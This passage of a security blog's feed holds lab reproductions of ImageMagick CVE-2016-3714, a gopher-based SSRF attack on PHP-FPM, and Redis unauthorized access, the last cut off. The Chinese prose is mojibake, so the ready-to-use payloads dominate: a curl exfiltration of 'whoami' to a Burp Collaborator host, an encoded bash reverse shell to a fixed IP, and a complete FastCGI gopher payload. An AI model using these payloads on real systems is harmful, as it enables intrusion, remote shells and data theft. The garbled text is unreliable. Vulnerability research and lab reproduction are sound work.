    <updated>2019-06-27T11:24:08.823Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ç ”ç©¶disable_functionçš„ä¸€äº›ç»•è¿‡æŠ€å·§ï¼Œå‘ç°äº†è¿™ä¸ªç»„ä»¶å¯¼è‡´çš„ä¸€äº›å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ„Ÿè§‰å¾ˆæœ‰è¶£ï¼Œäºæ˜¯å­¦ä¹ ä¸€ä¸‹ï¼Œåšä¸ªè®°å½•<a id="more"></a>ã€‚</p><p>ImageMagickæ˜¯ä¸€æ¬¾ä½¿ç”¨é‡å¾ˆå¹¿çš„å›¾ç‰‡å¤„ç†ç¨‹åºï¼Œå¾ˆå¤šå‚å•†éƒ½è°ƒç”¨äº†è¿™ä¸ªç¨‹åºè¿›è¡Œå›¾ç‰‡å¤„ç†ï¼Œè¿™ä¸œè¥¿å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯å‡ºåœ¨ImageMagickå¯¹httpså½¢å¼çš„æ–‡ä»¶å¤„ç†çš„è¿‡ç¨‹ä¸­ã€‚ç”±äºå­˜åœ¨ä¸€ä¸ªå§”æ‰˜Delegateçš„åŠŸèƒ½ï¼Œæ¯ä¸ªDelegateå¯¹åº”ä¸€ç§æ ¼å¼çš„æ–‡ä»¶,ç„¶åé€šè¿‡ç³»ç»Ÿçš„system()å‘½ä»¤æ¥è°ƒç”¨å¤–éƒ¨çš„ç¨‹åºå¯¹æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œå…³é”®ç‚¹å°±åœ¨äºè¾“å…¥çš„å†…å®¹æ²¡åšè¿‡æ»¤ï¼Œå¯ä»¥å¯¼è‡´ä¸€ä¸ªé—­åˆè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ä¸‹é¢æˆ‘å°±ç”¨vulhubä¸Šé¢çš„ä¸€ä¸ªç¯å¢ƒå»å¤ç°ä¸€ä¸‹</p><p>å¯ä»¥çœ‹ä¸€ä¸‹pç‰›çš„è¿™ç¯‡<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œå¯¹é‡Œé¢çš„å†…å®¹è®²çš„å¾ˆè¯¦ç»†äº†ï¼Œæ€ä¹ˆè§¦å‘ã€‚ç„¶åå¯ä»¥ä»è¿™ä¸ª<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L347" target="_blank" rel="noopener">æ–‡ä»¶</a>ä¸­èƒ½å¤Ÿå‘ç°è¿™ä¸€è¡Œä»£ç ï¼Œå½“ç„¶è¿™åªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œè¿˜å¯ä»¥åˆ©ç”¨å…¶ä»–çš„commandå»è§¦å‘ï¼Œpç‰›çš„æ–‡ç« ä¹Ÿè®²äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnHLVI.png" alt="ZnHLVI.png"></p><p>æˆ‘æ¯”è¾ƒæ³¨æ„çš„æ˜¯commandå®šä¹‰äº†ä»–å…·ä½“å¸¦å…¥system()æ‰§è¡Œçš„å‘½ä»¤ä¸º:â€wgetâ€ -q -O â€œ%oâ€ â€œhttps:%Mâ€ã€‚</p><p>è¿™é‡Œé¢å¯ä»¥æ³¨æ„åˆ°æœ‰å‡ ä¸ªå ä½ç¬¦ï¼Œå ä½ç¬¦çš„æ„æ€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%i  input image filename</span><br><span class="line">%o  output image filename</span><br><span class="line">%u  unique temporary filename</span><br><span class="line">%Z  unique temporary filename</span><br><span class="line">%#  input image signature</span><br><span class="line">%b  image file size</span><br><span class="line">%c  input image comment</span><br><span class="line">%g  image geometry</span><br><span class="line">%h  image rows (height)</span><br><span class="line">%k  input image number colors</span><br><span class="line">%l  image label</span><br><span class="line">%m  input image format</span><br><span class="line">%p  page number</span><br><span class="line">%q  input image depth</span><br><span class="line">%s  scene number</span><br><span class="line">%w  image columns (width)</span><br><span class="line">%x  input image x resolution</span><br><span class="line">%y  input image y resolution</span><br></pre></td></tr></table></figure><p>%mè¢«å®šä¹‰ä¸ºè¾“å…¥çš„å›¾ç‰‡æ ¼å¼ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„urlåœ°å€ã€‚å¯¹äºæ­¤å¤„å¯ä»¥åšä¸€ä¸ªå­—ç¬¦ä¸²çš„é—­åˆæ‹¼æ¥å¯¼è‡´ä¸€ä¸ªå¯æ§çš„é€¸å‡ºç‚¹ã€‚</p><p>å½“è¾“å…¥çš„æ˜¯è¿™æ ·çš„æ˜¯è¿™æ ·ä¸€ä¸ªä¾‹å­çš„æ—¶å€™ï¼Œ<code>https://www.a.com&quot;|ls &quot;-la</code>ï¼Œæ‹¼æ¥åˆ°ä¸Šé¢çš„å­—ç¬¦ä¸²å°±æ˜¯â€wgetâ€ -q -O â€œ%oâ€ â€œhttps:<a href="http://www.a.com&quot;|ls" target="_blank" rel="noopener">www.a.com&quot;|ls</a> â€œ-laâ€ ï¼Œç›¸å½“äºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œls -laçš„å‘½ä»¤</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnOSxO.png" alt="ZnOSxO.png"></p><h3 id="æ„é€ å›¾ç‰‡åˆ©ç”¨"><a href="#æ„é€ å›¾ç‰‡åˆ©ç”¨" class="headerlink" title="æ„é€ å›¾ç‰‡åˆ©ç”¨"></a>æ„é€ å›¾ç‰‡åˆ©ç”¨</h3><p>ImageMagickæ”¯æŒé€šè¿‡.svgã€.mvg(ImageMagickè‡ªå®šä¹‰çš„ä¸€ç§ç±»ä¼¼svgçš„æ ¼å¼)ï¼Œè¿™ç§ç±»å‹çš„æ–‡ä»¶æ¥è¿›è¡Œå›¾å½¢ç»˜åˆ¶ï¼Œå¹¶å…è®¸åœ¨å…¶ä¸­åŠ è½½å…¶ä»–çš„delegate(æ¯”å¦‚å­˜åœ¨æ¼æ´çš„https delegate)ã€‚å¹¶ä¸”åœ¨å›¾å½¢å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼ŒImageMagickä¼šè‡ªåŠ¨æ ¹æ®å…¶å†…å®¹è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶éšæ„å®šä¹‰ä¸ºpngã€jpgç­‰ç½‘ç«™ä¸Šä¼ å…è®¸çš„æ ¼å¼ï¼Œè¿™å°±å¢åŠ äº†å¾ˆå¤šåˆ©ç”¨åœºæ™¯ã€‚</p><p>ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œåœ¨urlæ‹¬å·å†…è¿›è¡Œé—­åˆï¼Œå¹¶ä¸”æ³¨å…¥ä½ è‡ªå·±éœ€è¦çš„å‘½ä»¤ï¼Œå¤šæ¡å‘½ä»¤ç”¨é€—å·åˆ†å‰²å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/image.jpg&quot;|id; &quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/ZnjpHH.png" alt="ZnjpHH.png"></p><p>å½“ç„¶ï¼Œåœ¨pç‰›çš„åšå®¢ä¸­ä¹Ÿæå‡ºäº†åŸºäºè¿™ä¸ªæ¼æ´åŸç†çš„å¥½å‡ ä¸ªCVEçš„åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥å»å°è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘æˆªå–äº†æˆ‘è‡ªå·±å®ç°æ–‡ä»¶åˆ é™¤æ•ˆæœå›¾</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnvyYn.png" alt="ZnvyYn.png"></p><p>å½“ç„¶ï¼Œpç‰›çš„è¿™ä¸ªç¯å¢ƒå»æä¾›äº†ä¸€ä¸ªä¸Šä¼ æ¥å£è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä»–çš„è¿™ä¸ªä»£ç æ˜¯å¦‚ä½•å»è§¦å‘è¿™ä¸ªæ¼æ´çš„ï¼Œå¯ä»¥å‘ç°å®ƒæ˜¯åˆ©ç”¨PHPæ‰©å±•ImageMagickå»è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”åªéœ€è¦è°ƒç”¨äº†Imagickç±»çš„æ„é€ æ–¹æ³•ï¼Œå³å¯è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œæ‰€ä»¥è¿™å°±ç»™æˆ‘ä»¬æ‰©å¤§åˆ©ç”¨æ€è·¯çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå°±æ˜¯ä¸åŒè¯­è¨€ImageMagickæ‹“å±•éƒ½å¾ˆæœ‰å¯èƒ½å¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±åœ¨å®æˆ˜ä¸­å»æµ‹è¯•ä¸€ä¸‹å•¦</p><p><img src="https://s2.ax1x.com/2019/06/27/Zup4jx.png" alt="Zup4jx.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªå«æœ‰payloadçš„pngå›¾ç‰‡äº†ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»åšä¸€ä¸ªDNSlogå¸¦å‡ºä¸€éƒ¨åˆ†æ•°æ®ï¼Œæ„é€ çš„payloadå¦‚ä¸‹ï¼Œç„¶åä¸Šä¼ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg&quot;|curl &quot;`whoami`.5bhnpoiffg2hswzgylt6a5jjmas1gq.burpcollaborator.net)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>bpæ¥æ”¶åˆ°çš„ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°æˆåŠŸå¸¦å‡ºæ•°æ®</p><p><img src="https://s2.ax1x.com/2019/06/27/ZumzMF.png" alt="ZumzMF.png"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å®ç°ä¸€ä¸ªåå¼¹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNzAuMTUwLzIzMzMgMD4mMQ== | base64 -d | bash`&quot;|| &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/Zuu7hq.png" alt="Zuu7hq.png"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ol><li>æ¼æ´å½±å“ImageMagick 6.9.3-9ä»¥å‰æ˜¯æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ€è·¯ä¸»è¦æ˜¯æ„é€ å›¾ç‰‡ï¼Œé‡Œé¢çš„payloadéœ€è¦è®¾ç½®å¥½ï¼Œè®©ImageMagickç»„ä»¶å¯¹å…¶è¿›è¡Œåº•å±‚systemå‡½æ•°çš„è§¦å‘ã€‚</li><li>é˜²å¾¡çš„æ–¹å¼ï¼Œå…¶ä¸€æ˜¯é€šè¿‡å‡çº§åˆ°é«˜ç‰ˆæœ¬ç»„ä»¶ï¼Œå…¶äºŒæ˜¯é€šè¿‡é…ç½®policy.xmlçš„æ–¹å¼æ¥ç¦æ­¢httpsã€mvgè¿™äº›delegateï¼Œæˆ–è€…ç›´æ¥åœ¨é…ç½®æ–‡ä»¶åˆ é™¤ç›¸åº”çš„delegateã€‚</li></ol><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘åœ¨ç ”ç©¶disable_functionçš„ä¸€äº›ç»•è¿‡æŠ€å·§ï¼Œå‘ç°äº†è¿™ä¸ªç»„ä»¶å¯¼è‡´çš„ä¸€äº›å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ„Ÿè§‰å¾ˆæœ‰è¶£ï¼Œäºæ˜¯å­¦ä¹ ä¸€ä¸‹ï¼Œåšä¸ªè®°å½•
    
    </summary>
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="0verwatch.top/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="å‘½ä»¤æ‰§è¡Œ" scheme="0verwatch.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Gopheræ”»å‡»FastCGIçš„å°ç»“</title>
    <link href="0verwatch.top/Gopher-fastcgi.html"/>
    <id>0verwatch.top/Gopher-fastcgi.html</id>
    <published>2019-06-23T09:28:46.000Z</published>
    <updated>2019-06-23T09:33:03.253Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸€ç¯‡æ–‡ç« æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« çš„ä¸€äº›æ‰©å±•å†…å®¹ï¼Œè™½ç„¶è¿™ä¸ªç¯å¢ƒæå…¶è‹›åˆ»ï¼Œä½†æ˜¯å­¦åˆ°ä¸€äº›æ–°çš„çŸ¥è¯†å°±å¥½ã€‚</p><p>è¿™ç¯‡æ–‡ç« å¤§å¤šæ•°å†…å®¹æ˜¯æ¥è‡ªpç¥åšæ–‡çš„ï¼Œæˆ‘åªæ˜¯åšä¸ªæ€»ç»“é¡ºä¾¿åšä¸ªå¤ç°ï¼ŒOrzã€‚<a id="more"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚fastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p><h3 id="PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰"><a href="#PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰" class="headerlink" title="PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰"></a>PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰</h3><p>ä¸ºä»€ä¹ˆä½¿ç”¨nginxè¿›è¡Œæ­å»ºphpç¯å¢ƒçš„æ—¶å€™ä¼šå‡ºç°php-fpmï¼ŸFPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒNginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚ç„¶åå†é€šè¿‡FPMå»å°†æ•°æ®äº¤ç»™å¯¹åº”çš„PHPæ–‡ä»¶ã€‚</p><p>è¿™ç¯‡æ–‡ç« çš„å…³é”®é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªfpmæ¥æ”¶çš„æ•°æ®ä¸Šï¼Œåªè¦æˆ‘ä»¬æˆ‘ä»¬æ„é€ æ»¡è¶³åè®®è§„èŒƒçš„è¯·æ±‚åŒ…å»è®¿é—®è¯¥è¿›ç¨‹ç›‘å¬çš„ç«¯å£ï¼Œå°±å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œï¼Œä½†æˆ‘ä»¬åœ¨åè®®ä¸­éœ€è¦æ‰“å¼€è®¾ç½®<code>auto_prepend_file = php://input</code>ä¸”<code>allow_url_include = On</code></p><h3 id="åˆ©ç”¨çš„æ¡ä»¶"><a href="#åˆ©ç”¨çš„æ¡ä»¶" class="headerlink" title="åˆ©ç”¨çš„æ¡ä»¶"></a>åˆ©ç”¨çš„æ¡ä»¶</h3><ul><li>libcurlç‰ˆæœ¬&gt;=7.45.0(ç”±äºEXPé‡Œæœ‰%00ï¼ŒCURLç‰ˆæœ¬å°äº7.45.0çš„ç‰ˆæœ¬ï¼Œgopherçš„%00ä¼šè¢«æˆªæ–­)</li><li>PHP-FPMç›‘å¬ç«¯å£</li><li>PHP-FPMç‰ˆæœ¬ &gt;= 5.3.3</li><li>çŸ¥é“æœåŠ¡å™¨ä¸Šä»»æ„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li></ul><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ vulhunbä¸Šçš„çš„ fpm ç¯å¢ƒï¼Œé»˜è®¤æ˜¯ç›‘å¬çš„9000ç«¯å£</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPwJoR.png" alt="ZPwJoR.png"></p><p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç°åœ¨å¤ç°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>find / -name &quot;*.php&quot;</code>å»æ‰¾ï¼Œå®é™…æƒ…å†µä¸­çš„è¯å°±å¾—çˆ†ç ´å»æ‰¾äº†23333</p><p>ä½¿ç”¨pç¥çš„<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">è„šæœ¬</a>æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªå¼€æ”¾çš„9000ç«¯å£ï¼Œæ˜¯å¯ä»¥æˆåŠŸå®ç°çš„ï¼Œæ‰€ä»¥è¯´ç›´æ¥å‘å¤–ç½‘æš´éœ²å‡ºè¿™ä¸ªæœåŠ¡çœŸçš„å¾ˆå±é™©ã€‚</p><p><img src="https://s2.ax1x.com/2019/06/23/ZP6Qhj.png" alt="ZP6Qhj.png"></p><p>ä½†æ˜¯æ—¢ç„¶æœ¬ç¯‡æ–‡ç« æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« çš„æ‰©å±•ï¼Œå°±éœ€è¦ä»ssrfçš„è§’åº¦å»å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤å…ˆæ˜¯æœ¬åœ°æŠ“å–ä¸€æ³¢æµé‡ï¼Œè¿™é‡Œä½¿ç”¨ncçš„æ–¹å¼å»è·å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 2333 -c <span class="string">"&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;"</span> /usr/<span class="built_in">local</span>/lib/php/PEAR.php</span><br></pre></td></tr></table></figure><p>ncç›‘å¬å¹¶è·å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333 &gt;  1.txt</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹å…¶å†…å®¹è¿›è¡Œurlç¼–ç ï¼Œè·å¾—exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line"></span><br><span class="line">ff = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> quote(ff)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/23/ZPWG0P.png" alt="ZPWG0P.png"></p><p>æ„é€ gopheråè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01xt%00%08%00%00%00%01%00%00%00%00%00%00%01%04xt%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04xt%00%00%00%00%01%05xt%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05xt%00%00%00%00</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨curlå»æ¨¡æ‹Ÿï¼Œè§‚å¯Ÿtmpç›®å½•ä¸‹ç¡®å®å†™å…¥æ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPfk9g.png" alt="ZPfk9g.png"></p><p>åªè¦åœ¨ssrfä¸‹æ¢æµ‹åˆ°æœ‰fpmæ¥å£çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è·å¾—ä»£ç æ‰§è¡Œçš„æƒé™å•¦ã€‚</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html" target="_blank" rel="noopener">https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™ä¸€ç¯‡æ–‡ç« æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« çš„ä¸€äº›æ‰©å±•å†…å®¹ï¼Œè™½ç„¶è¿™ä¸ªç¯å¢ƒæå…¶è‹›åˆ»ï¼Œä½†æ˜¯å­¦åˆ°ä¸€äº›æ–°çš„çŸ¥è¯†å°±å¥½ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç¯‡æ–‡ç« å¤§å¤šæ•°å†…å®¹æ˜¯æ¥è‡ªpç¥åšæ–‡çš„ï¼Œæˆ‘åªæ˜¯åšä¸ªæ€»ç»“é¡ºä¾¿åšä¸ªå¤ç°ï¼ŒOrzã€‚
    
    </summary>
    
      <category term="FastCGI" scheme="0verwatch.top/categories/FastCGI/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="FastCGI" scheme="0verwatch.top/tags/FastCGI/"/>
    
  </entry>
  
  <entry>
    <title>redisæœªæˆæƒè®¿é—®æ¼æ´ä¸€äº›åˆ©ç”¨</title>
    <link href="0verwatch.top/redis-vul.html"/>
    <id>0verwatch.top/redis-vul.html</id>
    <published>2019-06-16T08:37:20.000Z</published>
    <updated>2019-06-16T08:39:32.965Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h3><p>Rediså› é…ç½®ä¸å½“å¯ä»¥æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚(æœ‰ç‚¹ä¸å‹å¥½ï¼Œå¯èƒ½ç›´æ¥ä¼šå¯¼è‡´å®•æœº)<a id="more"></a></p><p>å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚</p><h3 id="æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨"><a href="#æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨" class="headerlink" title="æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨"></a>æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨</h3><h4 id="å†™ä¸ªshell"><a href="#å†™ä¸ªshell" class="headerlink" title="å†™ä¸ªshell"></a>å†™ä¸ªshell</h4><p>è¿™é‡Œæˆ‘ä»¥Ubuntu 14ç‰ˆåšçš„æµ‹è¯•ï¼Œå¾€ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹å†™ä¸€ä¸ªwebshellå°±è¡Œï¼Œåœ¨redisä¸Šè®¾ç½®äº†ç›®å½•ä»¥åŠæ–‡ä»¶åï¼Œå†™å…¥å†…å®¹</p><p><img src="https://s2.ax1x.com/2019/06/15/VIyLI1.png" alt="VIyLI1.png"></p><p>æ·»åŠ ä¸Šå»æ˜¯ä»¥è¿è¡Œçš„äººæƒé™æ·»åŠ çš„</p><p><img src="https://s2.ax1x.com/2019/06/15/VI6pse.png" alt="VI6pse.png"></p><p>å½“ç„¶ä¹Ÿèƒ½æ‰§è¡Œ</p><p><img src="https://s2.ax1x.com/2019/06/15/VI69qH.png" alt="VI69qH.png"></p><h4 id="ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•"><a href="#ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•" class="headerlink" title="ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•"></a>ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•</h4><p>ç°åœ¨æœ¬æœºç”Ÿæˆä¸€å¯¹ç§˜é’¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoJHGd.png" alt="VoJHGd.png"></p><p>æŠŠå…¬é’¥æ‹¿å‡ºæ¥</p><p><img src="https://s2.ax1x.com/2019/06/15/VoY9iQ.png" 